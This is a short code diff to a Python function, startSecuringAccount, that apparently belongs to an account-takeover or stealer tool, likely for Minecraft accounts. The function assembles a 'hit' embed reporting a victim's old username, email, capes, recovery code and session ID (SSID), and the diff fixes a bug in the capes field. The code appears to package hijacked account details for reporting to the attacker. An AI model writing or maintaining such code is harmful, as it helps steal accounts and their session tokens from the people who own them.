@@ -26,7 +26,7 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```")
     hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
     hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
-    hit_embed.add_field(name = "Capes:\n", value = f"```{account["method"]}```")
+    hit_embed.add_field(name = "Capes:\n", value = f"```{account["capes"]}```")
     hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")
 
     if account["SSID"] != "Failed to Get":
